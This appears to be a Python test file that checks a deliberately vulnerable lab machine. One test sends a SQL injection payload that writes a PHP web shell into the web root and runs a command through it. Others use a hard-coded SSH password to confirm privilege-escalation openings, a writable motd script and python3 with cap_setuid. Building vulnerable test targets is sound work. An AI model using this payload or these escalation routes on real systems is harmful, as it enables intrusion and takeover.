import unittest 
from libraries.http_tests import check_http_payload_200
from libraries.cmd_tests import test_cmd_execution_over_ssh

class TestPyre(unittest.TestCase):
    pyre_target_ip = "10.100.7.45"

    def test_0_pyre_sql_injection_write_file(self):
        result = check_http_payload_200(
            target_ip=self.pyre_target_ip,
            url_path="/panels.php",
            params={
                "id": "-1 UNION SELECT 1,2,3,4,5,6,7,'<?php system(\\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/tester.php' -- -"
            }
        )

        self.assertTrue(result.success, msg=result.message)


        result = check_http_payload_200(
            target_ip=self.pyre_target_ip,
            url_path="/tester.php",
            params={"cmd": "id"}
        )

        self.assertTrue(result.success, msg=f"Shell not accessible: {result.message}")
        self.assertIn("uid=", result.data or "", msg="RCE failed - no command output")

    # /etc/update-motd.d/99-sunspire should be writable by pyre user
    def test_1_pyre_motd_script_writable(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.pyre_target_ip,
            username="pyre",
            password="h1ewFWZG",
            command="if [ -w /etc/update-motd.d/99-sunspire ]; then echo 'valid'; fi",
            expected_output="valid"
        )

        self.assertTrue(result.success, msg=result.message)
    
    # test if python3 binary has cap_setuid+ep
    def test_2_pyre_python3_capabilities(self):
        result = test_cmd_execution_over_ssh(
            target_ip=self.pyre_target_ip,
            username="pyre",
            password="h1ewFWZG",
            command="getcap $(realpath /usr/bin/python3)",
            expected_output="cap_setuid=ep"
        )

        self.assertTrue(result.success, msg=result.message)
